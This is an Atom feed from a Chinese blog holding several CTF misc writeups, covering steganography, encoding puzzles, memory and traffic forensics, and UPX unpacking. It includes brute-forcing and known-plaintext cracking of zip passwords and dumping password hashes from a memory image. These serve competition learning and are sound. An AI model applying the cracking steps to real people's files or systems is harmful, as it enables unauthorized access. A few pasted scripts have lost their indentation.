<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://ayanagi.fun</id>
    <title>雨霖铃</title>
    <updated>2021-05-11T05:02:07.734Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="http://ayanagi.fun"/>
    <link rel="self" href="http://ayanagi.fun/atom.xml"/>
    <subtitle>又岂在朝朝暮暮。</subtitle>
    <logo>http://ayanagi.fun/images/avatar.png</logo>
    <icon>http://ayanagi.fun/favicon.ico</icon>
    <rights>All rights reserved 2021, 雨霖铃</rights>
    <entry>
        <title type="html"><![CDATA[2021第六届全国网络空间安全大赛 misc wp]]></title>
        <id>http://ayanagi.fun/cstc2021/</id>
        <link href="http://ayanagi.fun/cstc2021/">
        </link>
        <updated>2021-05-06T04:13:38.000Z</updated>
        <content type="html"><![CDATA[<p>流量分析是一血，感觉还不错，有些题目有些比较抖机灵的部分吧。</p>
<h2 id="rgb">RGB</h2>
<p>附件<code>code.txt</code>，打开是图片的RGB值，稍微修改一下数据令其为<code>R,G,B</code>形式的格式，看了一下有28864行，分解一下，第一次试的是164*176，出来一个乱图，那么换一下xy，脚本如下</p>
<pre><code class="language-python">from PIL import Image

x = 176    
y = 164    

im = Image.new(&quot;RGB&quot;, (x, y))   
file = open('code.txt')    



for i in range(0, x):
    for j in range(0, y):
        line = file.readline()  
        rgb = line.split(&quot;,&quot;)  
        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))  

im.show()
</code></pre>
<p>得到的flag保存为图片，扔进imagemagick里flop一下</p>
<p><code>flag{c1d836d1db9d42dd}</code></p>
<h2 id="zip">zip</h2>
<p>爆破，一开始没做出来，先后采用了1-8位纯数字和1-8位大写字母和数字组合，没有尝试小写字母数字组合，后来再试得到密码<code>ff123</code>，解压得到txt文件和加密的文档，txt文件内容得知考点应该是0宽和培根，培根解得文档密码<code>xyj</code>，打开文档复制全部内容解密，发现并不是0宽，在文档里全选修改字体颜色为红色发现flag。<code>flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</code></p>
<h2 id="memory_1">Memory_1</h2>
<p>附件<code>val.vmem</code>，在<code>volatility</code>里查看信息</p>
<pre><code class="language-shell">vol.py -f val.vmem imageinfo
</code></pre>
<p>Win7SP1x64系统，先看一下pslist，发现一个cscript.exe比较可疑，猜测是文件名，拿去md5提交错误，那么查看cmdline，发现<code>Command line : cscript &quot;C:\Windows\TEMP\UEAOGWBdwyydm.vbs&quot;</code></p>
<p>那么病毒文件应该就是<code>UEAOGWBdwyydm.vbs</code>了</p>
<p><code>flag{24060da3d327991115a96e7099da25c3}</code></p>
<h2 id="memory_2">Memory_2</h2>
<p>hashdump查看用户列表，有一个<code>test$</code>，带$的就是隐藏用户，作为flag的md5的前半段，另一个是来源进程，那么就需要知道什么进程使其添加账号。使用psscan查看隐藏起来的进程，多了比较可疑的<code>net1.exe</code>、</p>
<p><code>KiiKCuSco.exe</code>，分别尝试，发现前者正确。</p>
<p><code>flag{45321c07f425d915c55424957353dd07}</code></p>
<h2 id="slowloris">Slowloris</h2>
<p>流量分析，wireshark打开，搜索http和POST字符串，寻找POST请求包追踪HTTP，导出对象为HTTP，没发现什么，搜索题目Slowloris得知为slowloris拒绝服务攻击，看到许多GET包头只有一个CLRF，证实了这一点,并且GET包的destination都是<code>195.8.178.227</code>。那么攻击方式就是slowloris了，这里运气比较不错，s取了小写，<code>slowloris/195.8.178.227</code>的md5值就是flag</p>
<p><code>flag{3fc9d4a929cb690728d2b76c76483abe}</code></p>
<h2 id="packpackpack">pack!pack!pack!</h2>
<p>exe文件，双击打开提示缺少dll，到网上下了一个dll，打开没什么东西。扔进<code>exeinfope</code>发现有upx壳，在kali下脱壳报错，搜索错误信息，获得upxf工具修复文件后再次脱壳，成功，在kali下直接打开脱壳后的exe归档文件，结合题目的resource描述，进入.rsrc文件夹发现<code>string.txt</code>，拖出来得到flag的前半部分<code>flag{0bed66d154ccbdd0</code>，其他文件夹再浏览一下发现一个比较可疑的<code>138.bmp</code>，扔进winhex发现最后面有base64串<code>N2E2MzQyYWJmOTdhNWNmY30=</code>，解得<code>7a6342abf97a5cfc}</code>组合起来得到完整的flag</p>
<p><code>flag{0bed66d154ccbdd07a6342abf97a5cfc}</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[V&N CTF2021 misc 简要复现]]></title>
        <id>http://ayanagi.fun/VNCTF2021/</id>
        <link href="http://ayanagi.fun/VNCTF2021/">
        </link>
        <updated>2021-03-17T06:19:41.000Z</updated>
        <content type="html"><![CDATA[<p>当时懒得折腾。主要是口腔溃疡加上下雨，基金暴跌，心情不是很好。加上各种压力感觉有点力不从心了，也少了以前学习的那份冲劲。<br>
颓废。</p>
<h1 id="冰冰好像藏着秘密">冰冰好像藏着秘密</h1>
<p>损坏的压缩包一枚，修复解压得<code>FFT.png</code>看图片名应该就是要傅里叶变换取得盲水印了吧，不过一开始没注意就扔进自动机里爆了，出来了个假flag，交上去wa了就没管了。<br>
理解并抄下FFT脚本</p>
<pre><code class="language-python">import cv2 as cv #opencv库，对图像处理必备
import numpy as np #numpy库，同样
import matplotlib.pyplot as plt #matplotlib库，作图必备
img = cv.imread('FFT.png', 0) #右键查看图片的时候可以发现只有8位深，直接读为灰度图像
f = np.fft.fft2(img) #做频率变换
fshift = np.fft.fftshift(f) #转移像素做幅度谱
s1 = np.log(np.abs(fshift))#取绝对值：将复数变化成实数取对数的⽬的为了将数据变化到0-255
plt.subplot(121)
plt.imshow(img, 'gray')
plt.title('original')
plt.subplot(122)
plt.imshow(s1,'gray')
plt.title('center')
plt.show()
</code></pre>
<figure data-type="image" tabindex="1"><img src="http://ayanagi.fun/post-images/1616130338869.png" alt="" loading="lazy"></figure>
<h1 id="do_you_like_rhythm_doctor">Do_you_like_Rhythm_Doctor</h1>
<p>使用节奏医生编辑器打开文件，节拍分为矩形波形，猜测01组合，一行一行进行，抄下节拍内容二进制转字符<br>
<code>flag{W31come_V&amp;N_CTF}</code></p>
<h1 id="interesting_fishing">interesting_fishing</h1>
<p>套娃蛮多的，主要学习到的知识是eml文件相关、RTF下的unicode编码。<br>
把bin改为eml，用的是foxmail打开得到图片和压缩包。取得两个文件，图片扔oursecret得到第二部分flag，<br>
压缩包解压，查看工程文件，发现假flag，生成文件后报错发现powershell命令执行，去找Browse.VC.db，文件夹选项里把隐藏文件显示打开，在<code>\giveyourflag\giveyourflag\x64\Debug</code>目录下可以看到<code>Browse.VC.db</code>文件，记事本打开，将里面的b64串解密，得到</p>
<pre><code>\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?
</code></pre>
<p>这是RTF格式下的unicode编码，原理是RTF格式中使⽤\uN?表示⼀个unciode字符。\u后跟⼀个带符号的16位⼗进制整数值接⼀个占位符，⽤？表示。N⼤于32767的话，则表示为负数。解混淆示例如下：<br>
<code>L&quot;h&quot; == 0x0068 == -(-0x0068) == -(0xFFFF+1-0x68) == -65432=\u-65432?</code><br>
按照规则转换数据得到一个rar的URL，下载打开右边提示4位数字，rar5压缩方式，使用hashcat或者Accent RAR Password Recovery都可以。<br>
解压出一个docx，直接改后缀解压，敏感文件hideinfo.xml，winhex看到0宽，记事本复制出来解。<br>
<code>vnctf{APT_1S_c0M1nG_fr0m_l@z@RuS}</code></p>
<h1 id="happynewyear">HAPPYNEWYEAR</h1>
<p>chinese code和谢赫语言密码的编码，使用在线编码全家桶https://www.dcode.fr/zh-CN<br>
解压得到happynewyear.png，stegpy爆破一把梭，用的是L1师傅做的脚本<br>
https://github.com/L1near/CTFpics-1/blob/master/webpsteg.py<br>
<code>VNCTF{HappyNewY3a5}</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ACTF2021Misc 复现&wp]]></title>
        <id>http://ayanagi.fun/ACTF2021/</id>
        <link href="http://ayanagi.fun/ACTF2021/">
        </link>
        <updated>2021-03-14T07:09:49.000Z</updated>
        <content type="html"><![CDATA[<p>面向新生的一个比赛，但是还是没法都做出来，没有以前笨笨的那股冲劲了，其实还是遇到了瓶颈。</p>
<h1 id="real_way">Real_way</h1>
<p>思路应该是找到和路径文件夹名顺序相同的flag。懒得做了，直接看wp:<br>
五层目录，每层目录中有7个文件夹，且每个叶子节点上都有一个 flag.txt 文件，所以总共是16,807 个flag.txt文件夹</p>
<p>仔细一看就能看出来文件夹的命名都很简单，flag中的密文也很简单，也很有对应关系</p>
<p>这些个flag文件中只有一个是正确的，何谓正确的呢，就是它密文和它文件所在的路径相同<br>
编写脚本如下</p>
<pre><code class="language-python">import os
import random

m=[]
for i in range(7):
    m.append(chr(ord('a')+i))

print(&quot;Êý¾ÝÁ¿£º&quot;+str(m))
strmap=[]
flag_map=[]
for i1 in m:
    for i2 in m:
        for i3 in m:
            for i4 in m:
                for i5 in m:
                    temp=i1+'\\'+i2+'\\'+i3+'\\'+i4+'\\'+i5
                    strmap.append(temp)
                    temp=i1+i2+i3+i4+i5
                    flag_map.append(temp)
#print(strmap)

def makemap(level,list_map):
    if level&gt;0:
        level-=1
        makemap


def makedir():
    for p in strmap:
        this='D:\\CTF\\QuestsAndWriteUps\\ACTF\\Real_way'
        #path=os.path.abspath('.')+'\\misc_test\\'+p
        path=this+'\\ACTF\\'+p
        os.makedirs(path)
        temp=open(path+'\\flag.txt','w')
        temp.write('actf{'+flag_map[random.randint(0, len(strmap)-1)]+'}')
    
def checkflag():
    basepath='D:\\CTF\\QuestsAndWriteUps\\ACTF\\Real_way'
    #basepath=os.path.abspath('.')
    ans=[]
    for i in range(len(strmap)):
        path=basepath+'\\ACTF\\'+strmap[i]+'\\flag.txt'
        file=open(path,'r')
        flag=file.readline()
        if flag_map[i]==flag[5:flag.find('}')]:
            #print(flag)
            ans.append(flag)
        #else:
            
            #print('error ' +flag_map[i]+' : '+flag[5:flag.find('}')])
            #print(flag[5:flag.find('}')])
        file.close()
    return ans
        
        
    

if __name__=='__main__':
    #makedir()
    print('Ä¿Â¼É¨Ãèing')
    ans=checkflag()
    print(ans)
</code></pre>
<h1 id="与熊论道">与熊论道</h1>
<p>解与熊论道，解社会主义核心价值观，得<code>pwd:123456</code>，附件里有bmp，wbs43open解，一分钟就出来的题。ps:和上一题难度差距居然如此之大。<br>
<code>ACTF{PXY_wants_@_bOyfri3nd}</code></p>
<h1 id="禁止摸鱼">禁止摸鱼</h1>
<p>扔winhex，尾巴zip，暴力得flag.txt，密码是3位的，而且还是弱口令:<code>123</code>，我从第1位开始爆破的，一瞬间就出了，有师傅从4位密码开始爆，爆了很久都没出。ps:和第一题难度差距竟如此之大。</p>
<h1 id="纳什均衡">纳什均衡</h1>
<p>nc上去玩了一下，意思就是给若干个石头，你每次可以去除一些，对方也可以去除一些，双方去除的最大数量相同。你先行动，谁先去除到最后一个石头谁就赢了。要连胜5局才能得到flag。蕴含高深知识的看起来简单但是其实很难的游戏。思路挺有趣的，也有深度，奈何自己脑子笨，且不会写代码，最多玩到过第三局就没了，搜了下题目，博弈论。各种文章写得天花乱坠的，看不懂，也浮躁不想钻研。<br>
看wp，写的居然是巴什博奕，巴什就巴什为啥题目要叫纳什(强大的ACTF主办方应该不会犯这种错误吧，肯定是我水平太低无法理解此中深意)，而且如果我要是搜的是巴什就直接做出来了()<br>
以下是百度百科的规范描述思路，只要知道是这么一回事很快就能做出来。也算一些课外知识吧。</p>
<p>巴什博弈：只有一堆n个物品，两个人轮流从这堆物品中取物，规定每次至少取一个，最多取m个。最后取光者得胜。<br>
显然，如果n=m+1，那么由于一次最多只能取m个，所以，无论先取者拿走多少个，后取者都能够一次拿走剩余的物品，后者取胜。因此我们发现了如何取胜的法则：如果n=（m+1）r+s，（r为任意自然数，s≤m),那么先取者要拿走s个物品，如果后取者拿走k（≤m)个，那么先取者再拿走m+1-k个，结果剩下（m+1）（r-1）个，以后保持这样的取法，那么先取者肯定获胜。总之，要保持给对手留下（m+1）的倍数，就能最后获胜。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[0基础的Re基操]]></title>
        <id>http://ayanagi.fun/Reverse/</id>
        <link href="http://ayanagi.fun/Reverse/">
        </link>
        <updated>2021-03-12T14:00:30.000Z</updated>
        <content type="html"><![CDATA[<p>先占坑。不包含基础/前置理论知识(算法，汇编之类的，个人喜欢先摸题目，有一定积累之后再切入到理论的理解反而会有柳暗花明与茅塞顿开之感。)<br>
学到多少写多少。以题目为例</p>
<h1 id="1ida打开shiftf12查看字符串">1.IDA打开SHIFT+F12查看字符串</h1>
<p>例题：<strong>BUUCTF easyre</strong><br>
下载附件拖进IDA，SHIFT+F12呼出Strings Window可以看到flag<br>
<img src="http://ayanagi.fun/post-images/1615557899074.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hgame2021 misc WP+复现]]></title>
        <id>http://ayanagi.fun/Hgame2021/</id>
        <link href="http://ayanagi.fun/Hgame2021/">
        </link>
        <updated>2021-03-01T10:29:07.000Z</updated>
        <content type="html"><![CDATA[<p>1305分，只拿了总分一半不到。厮混了半年水平竟如此半吊子，心中还是失落更多，但是步伐不会停下。有懊恼，因为搜索引擎使用方式不恰当而和400分失之交臂。</p>
<h1 id="week1">Week1</h1>
<h2 id="base全家福">Base全家福</h2>
<p><code>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</code></p>
<p>解b64，解b32，解b16</p>
<p>其实使用basecrack就能实现自动base机</p>
<pre><code class="language-shell">python basecrack.py --m
                python basecrack.py -h [FOR HELP]

[&gt;] Enter Encoded Base: R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09

[-] Iteration: 1

[-] Heuristic Found Encoding To Be: Base64

[-] Decoding as Base64: GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======

{{&lt;&lt;======================================================================&gt;&gt;}}

[-] Iteration: 2

[-] Heuristic Found Encoding To Be: Base32

[-] Decoding as Base32: 6867616D657B57653163306D655F74305F4847344D335F323032317D           

{{&lt;&lt;======================================================================&gt;&gt;}}             

[-] Iteration: 3                                                                           

[-] Heuristic Found Encoding To Be: Base16                                                 

[-] Decoding as Base16: hgame{We1c0me_t0_HG4M3_2021}                                       

{{&lt;&lt;======================================================================&gt;&gt;}}             

[-] Total Iterations: 3                                                                    

[-] Encoding Pattern: Base64 -&gt; Base32 -&gt; Base16                                           

[-] Magic Decode Finished With Result: hgame{We1c0me_t0_HG4M3_2021}                        

[-] Finished in 0.0023 seconds 
</code></pre>
<p><code>hgame{We1c0me_t0_HG4M3_2021}</code></p>
<h2 id="不起眼压缩包的养成方法">不起眼压缩包的养成方法</h2>
<p>因为压缩算法的问题被卡了一整天。一道非常简单的题。</p>
<p>点开地址，一张图片，右键保存下来，直接binwalk出压缩包，需要解压密码，旁边注释是8位数字，爆破之</p>
<p>PW:<code>70415155</code>，得到plain.zip和NO PASSWORD.txt</p>
<p>高能来了，一看就知道是明文攻击，使用archpr折腾了n久一直报错，而且我也知道是压缩方式/软件之类的和出题人不一样，当时想着是知道出题人使用的压缩软件就能出来，后来各种查询资料，发现一个师傅做明文攻击的wp用的这种方式：把原来压缩包里的NO PASSWORD.txt删除，再把已经有的NO PASSWORD.txt扔进去，结果：失败。甚至怀疑是不是错了。看txt的内容，以为是0宽，扔进去也不是。毕竟第一周的签到以外，咋能难到哪里去，肯定不是。不能高估了题目。在bandzip压缩的时候看到的压缩方式，有个storage，txt里也提到了这个，使用storage方式压缩制造明文档案即可。</p>
<p>PW:<code>C8uvP$DP</code>，得到flag.zip，这次总该是伪加密了吧。伪加密解之，得到一串字符，其实不用伪加密也可以，zip直接丢winhex就能看到flag.txt里的内容，是一堆看起来像是utf-8编码的东西，但是解了发现并不是，是html编码，解码之。</p>
<p><code>hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d}</code></p>
<h2 id="galaxy">Galaxy</h2>
<p>流量分析，wireshark打开，搜索http协议，找到两个GET方法，随便追踪一个HTTP流，发现访问了一张百度图片，那么导出对象为http，选中galaxy.png，save，得到一张图片，扯进kali发现是打不开的，那必然是改宽高。一改就行了。</p>
<p><code>hgame{Wh4t_A_W0nderfu1_Wa11paper}</code></p>
<h2 id="word-remaster">Word Re:MASTER</h2>
<p>一个压缩包，解压出2个docx:first.docx、maimai.docx，都丢进winhex，在发现maimai.docx是加了密的文档，尾部还有提示。所以直接把first.docx改后缀为zip找到一个password.xml，扯进winhex发现brainfuck，解得maimai.docx的文档密码:</p>
<p><code>DOYOUKNOWHIDDEN?</code></p>
<p>解开，直接就能发现一堆空格(因为我的word默认是显示所有隐藏的东西的)，全选之后清除格式，然后复制，word里有张图片内容和雪有关(喜欢！雪！真实的魔法)，那必然是snow隐写，把这堆空格放进flag.txt</p>
<pre><code class="language-cmd">SNOW.EXE -C flag.txt
</code></pre>
<p><code>hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX}</code></p>
<p>至此，第一周misc题目AK，wp完成时间2021年1月31日15:03:38</p>
<h1 id="week2">Week2</h1>
<h2 id="tools">Tools</h2>
<p>拿了一血，有点小高兴。</p>
<p>附件zip一个，解压出<code>F5.7z</code>和<code>Matryshka.jpg</code>，图片的内容是一个套娃(字面意思)，但是题目本身也算套娃。压缩包带密码，密码肯定就是从图片来了，肯定是F5隐写，而且binwalk的时候可以看到一行带<code>copyright</code>的串，也明示了是F5隐写，F5隐写的密码从右键属性的详细信息得到。</p>
<p><code>!LyJJ9bi&amp;M7E72*JyD</code></p>
<p>那么</p>
<pre><code class="language-shell">java Extract Matryoshka.jpg -p '!LyJJ9bi&amp;M7E72*JyD'
</code></pre>
<p>得到<code>output.txt</code>的内容为</p>
<p><code>e@317S*p1A4bIYIs1M</code></p>
<p>从7z解压出<code>Steghide.7z</code>和<code>01.jpg</code>，图片是张二维码的1/4，一看就知道最后要拼起来，肯定是Steghide隐写了，密码都是右键得到。</p>
<p><code>A7SL9nHRJXLh@$EbE8</code></p>
<pre><code class="language-shell">steghide extract 01.jpg 
Enter passphrase: 
wrote extracted data to &quot;pwd.txt&quot;.
</code></pre>
<p><code>pwd.txt</code>的内容为</p>
<p><code>u0!FO4JUhl5!L55%$&amp;</code></p>
<p>从7z解压出<code>Outguess.7z</code>和<code>02.jpg</code>，那就outguess咯。</p>
<pre><code class="language-shell">outguess -r 02.jpg -t out.txt -k z0GFieYAee%gdf0%lF
</code></pre>
<p><code>out.txt</code>的内容为</p>
<p><code>@UjXL93044V5zl2ZKI</code></p>
<p>从7z解压出<code>JPHS.7z</code>和<code>03.jpg</code>，那就JPHS咯。</p>
<figure data-type="image" tabindex="1"><img src="http://ayanagi.fun/post-images/1614603441109.png" alt="" loading="lazy"></figure>
<p>两个空都要填上<code>rFQmRoT5lze@4X4^@0</code></p>
<p>保存为<code>01.txt</code>，其内容为<code>xSRejK1^Z1Cp9M!z@H</code></p>
<p>解压得到<code>04.jpg</code></p>
<p>使用画图拼合4张裂开的二维码扫码即可得到flag</p>
<p><code>hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</code></p>
<h2 id="telegraph">Telegraph</h2>
<p>小题大做了。直接扔audacity，查看频谱，发现几个大字：<code>850Hz</code>。第一感觉竟然是去年roarCTF那个FM，甚至去配了<code>gqrx-sdr</code>去分析，啥也没得到。搞了半天浪费了特别多时间。应该是走进死胡同了。</p>
<p>一看文件名是中文电码，解码后得到：<code>带通滤波器</code>。搜了一通之后啥也没得到。这个hint其实有些误导</p>
<p>最后面简单粗暴的解法是：audacity直接播放音频，一段音乐过后能够听到摩斯电码。鼓捣一下频谱能够发现确实有摩斯电码，直接解码就能得到flag，后知后觉才知道850Hz是告诉你摩斯电码的大概位置。</p>
<p><code>YOURFLAGIS4G00DS0NGBUTN0T4G00DMAN039310KI</code></p>
<p>flag:<code>hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</code></p>
<h2 id="hallucigenia">Hallucigenia</h2>
<p>一张图片，丢winhex，屁股正常，stegsolve查看lsb通道，正常，更改滤镜，发现一张二维码，扫描得到</p>
<pre><code>gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=
</code></pre>
<p>一看就b64，转换得到一个<img src="http://ayanagi.fun/post-images/1614603545983.png" alt="" loading="lazy"></p>
<p>注意82 60，是png的屁股的倒序。而且是按照字节单位来倒序的，导致我的逆序脚本不好使了，当时又折腾了好些时间打算写个脚本，但是菜鸡如我，不会写。当机立断手搓，直接反过来手抄图片，粘贴进010editor保存为<code>1.png</code>，是个镜像反转的flag，imagemagick伺候</p>
<p><code>Transform→flop</code>得到</p>
<figure data-type="image" tabindex="2"><img src="http://ayanagi.fun/post-images/1614603552270.png" alt="" loading="lazy"></figure>
<p><code>hgame{tenchi_souzou_dezain_bu}</code></p>
<h2 id="dns">DNS</h2>
<p>这题又学到了流量分析的一个题型。很不错。</p>
<p>第一次遇到DNS流量分析，wireshark打开，一通操作啥也没出来。稍微查了下DNS流量分析之类的东西，学习了一些关于DNS的知识，那么</p>
<p>过滤dns协议，得到以下6条<img src="http://ayanagi.fun/post-images/1614603562316.png" alt="" loading="lazy"></p>
<p>找response类型的流量，点开<code>Domain Name System(response)</code>下的<code>Answers</code>，按理来说会有TXT，内容是flag，但是必然没这么明显的原题。在唯一一个UDP流量里面找到了服务器ip的端口，尝试<code>curl</code>和<code>nc</code>访问，拒绝了。应该不是这么做的。</p>
<p>binwalk一下，得到一个html，拿出来扔winhex发现hint:</p>
<figure data-type="image" tabindex="3"><img src="http://ayanagi.fun/post-images/1614603570405.png" alt="" loading="lazy"></figure>
<p><code>Do you know SPF?</code></p>
<p>搜索关键词DNS SPF，找到这篇文章。<code>https://blog.csdn.net/weixin_34232617/article/details/91699242</code></p>
<p>我们需要查询SPF记录，那么使用dig指令，域名是流量中的<code>flag.hgame2021.cf</code></p>
<pre><code class="language-shell">dig txt flag.hgame2021.cf
</code></pre>
<figure data-type="image" tabindex="4"><img src="http://ayanagi.fun/post-images/1614603575900.png" alt="" loading="lazy"></figure>
<p><code>hgame{D0main_N4me_5ystem}</code></p>
<p>20:00:00~21:33:12，一个半多小时ak了misc，在misc的学习路途上也算有些进步了吧。</p>
<h1 id="week-3">Week 3</h1>
<p>week3巨难，爆了零。</p>
<h2 id="a-r-k">A R K</h2>
<p>第一次遇到。可见我的见识是多么浅薄。拿到流量包操作了一通啥也没出来，这次不像上周有那么好的资料可查了，直接放弃了</p>
<p>FTP流量分析和TLS流量分析，从FTP流量入手，选中FTP-DATA追踪TCP流，另存为可得到ssl.log</p>
<p>导入后可解密TLS流量。</p>
<p>导出为HTTP对象，结合hint<code>明⽇⽅⾈是⼀款塔防游戏，可以将可部署单位放置在场地中。并且具有⾃律功能，可以记录部署的 操作。</code></p>
<p><code>getbattleReplay</code>在<code>battleStart</code>之前，结合其翻译不难得知这个就是⾃律的数据，且第⼆个才是服 务端返回给客⼾端的数据，根据 Content-type 将其导出为 json</p>
<p>里面有一串b64，解得一个zip文件，解压提示文件损坏，查看头是<code>504B0506</code>，将其修改为<code>504B0304</code>即可解压出<code>default_entry</code>，都是json代码</p>
<p>抄脚本</p>
<pre><code class="language-python">import json5
import numpy as np
from PIL import Image
def json2img(src: str, o: str):
flagJson = json5.loads(open(src, 'r').read())
resImg = Image.new('RGB', (100,100), (255,255,255))
resArr = np.array(resImg)
for dusk in flagJson['journal']['logs']:
resArr[dusk['pos']['row']][dusk['pos']['col']] = (0,0,0)
resImg = Image.fromarray(resArr).convert('RGB')
resImg.save(o)
json2img('default_entry.json', 'res.png')
</code></pre>
<p>扫描二维码</p>
<p><code>hgame{Did_y0u_ge7_Dusk?}</code></p>
<h2 id="a-r-c">A R C</h2>
<p>附件弄下来，<code>8558.png</code>里的内容抄下来解b85解b58后啥也没得到，对付压缩包<code>BVenc(10001540).7z</code>，把10001540拿去加密成BV号作为解压密码，错了，还有个tables.ttf字体文件，搞不懂有啥用，放弃了。后来更新了hint，也懒得看了直接被搞自闭。</p>
<p>看了wp才知道解完b85后那一串是一个表，而且还要学习一下BV号的原理才能写出对应的编码脚本。</p>
<p>还是抄。</p>
<pre><code class="language-python"># table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF' # 原表
table='h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY' # 我换的表
tr={}
for i in range(58):
tr[table[i]]=i
s=[11,10,3,8,4,6]
xor=177451812
add=8728348608
def dec(x):
r=0
for i in range(6):
r+=tr[x[s[i]]]*58**i
return (r-add)^xor
def enc(x):
x=(x^xor)+add
r=list('BV1 4 1 7 ')
for i in range(6):
r[s[i]]=table[x//58**i%58]
return ''.join(r)
print(enc(10001540))
# BV17f411J77h
</code></pre>
<p>解压打开<code>arc.mkv</code>搜一下视频里的问题，答案是42，视频末尾有两行字符串<code>#)+F7IIMEH:?Injiikffi</code>和<code>pwbvmpoakiscqdobil</code>，再看<code>fragment.txt</code>都是无意义的东西，带有空格，结合hint⽤了某种ROT的范围，但是位移不⼀样。词频分析是个好东西，别忘了视频⾥的问题。</p>
<p>字符范围是 ROT47 的，但是位移换成了 42 (实际上出题时是 52，这样再转回来就是 42)</p>
<p>解密后只有前两⾏是有⽤的信息，先看第⼀⾏： <code>Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.</code>得知视频⾥第⼀⾏也是和 fragment.txt ⼀样 <code>#)+F7IIMEH:?Injiikffi</code> <code>MSUpasswordis:6557225</code> ⽤所给的软件和 MSU 搜索可以找到：https://www.compression.ru/video/stego_video/index_en.htm l 安装提供软件，将插件导⼊ plugins32 ⽂件夹，启动 VirtualDub.exe ，导⼊视频：</p>
<p>Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0，弹出 MSU StegoVideo 插件界⾯。选择 Extract file from video，并填好密码和分离出的⽂件的路径：</p>
<p>OK -&gt; OK，回到主界⾯，进度条拉到视频最开始处，File -&gt; Save Video，随便选⼀下输出路径，得到隐 写的 txt ⽂件：</p>
<pre><code>arc.hgame2021.cf
Hikari
Tairitsu
</code></pre>
<p>打开⽹站，输⼊⽤⼾名和密码：</p>
<p>继续去看第⼆⾏：</p>
<pre><code> For line2, Liki has told you what it is, and Akira is necessary to do it. 
</code></pre>
<p>有的东西可以参考Crypto WEEK-1 第⼀题。</p>
<p>Crypto WEEK-1 ⾥⽤到 Liki 的只有维吉尼亚密码，所以是 Vigenere-Akira：</p>
<p><code>pwbvmpoakiscqdobil</code></p>
<p><code>pmtempestissimobyd</code></p>
<p>/ 不是可输⼊的意思，是⽹站路径 所以访问 https://arc.hgame2021.cf/pmtempestissimobyd 得 flag：</p>
